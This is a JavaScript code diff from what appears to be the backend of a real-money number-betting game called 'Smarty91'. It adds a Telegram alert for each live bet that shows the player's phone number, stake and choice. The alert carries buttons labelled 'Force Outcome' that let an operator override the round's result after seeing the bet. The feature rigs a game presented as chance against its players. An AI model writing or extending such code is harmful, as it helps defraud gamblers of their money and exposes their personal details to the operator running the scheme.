@@ -145,3 +145,41 @@ export async function notifyNewWithdrawal({ userId, phone, amount, accountHolder
 
     return sendTelegramMessage(message, inlineKeyboard);
 }
+
+export async function notifyNewBet({ mode, periodId, phone, userId, betAmount, selection, selectionLabel, remainingSec }) {
+    const timeStr = new Date().toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true });
+    const choiceText = selectionLabel || selection;
+    const modeUpper = String(mode).toUpperCase();
+
+    const message = `🚨 <b>LIVE BET PLACED! (Smarty91)</b>
+━━━━━━━━━━━━━━━━━━━━
+🎮 <b>Mode:</b> <code>${modeUpper}</code>
+🔢 <b>Period ID:</b> <code>${periodId}</code>
+👤 <b>Player:</b> <code>${phone || userId}</code>
+💰 <b>Bet Amount:</b> <b>₹${Number(betAmount).toLocaleString('en-IN')}</b>
+🎯 <b>Choice:</b> <b>${choiceText}</b>
+⏳ <b>Time Left:</b> ~${remainingSec || 0}s (${timeStr})
+━━━━━━━━━━━━━━━━━━━━
+⚡ <b>Tap a Number below to Force Outcome:</b>`;
+
+    const inlineKeyboard = {
+        inline_keyboard: [
+            [
+                { text: '0 🟣🔴', callback_data: `override_${mode}_0` },
+                { text: '1 🟢', callback_data: `override_${mode}_1` },
+                { text: '2 🔴', callback_data: `override_${mode}_2` },
+                { text: '3 🟢', callback_data: `override_${mode}_3` },
+                { text: '4 🔴', callback_data: `override_${mode}_4` }
+            ],
+            [
+                { text: '5 🟣🟢', callback_data: `override_${mode}_5` },
+                { text: '6 🔴', callback_data: `override_${mode}_6` },
+                { text: '7 🟢', callback_data: `override_${mode}_7` },
+                { text: '8 🔴', callback_data: `override_${mode}_8` },
+                { text: '9 🟢', callback_data: `override_${mode}_9` }
+            ]
+        ]
+    };
+
+    return sendTelegramMessage(message, inlineKeyboard);
+}
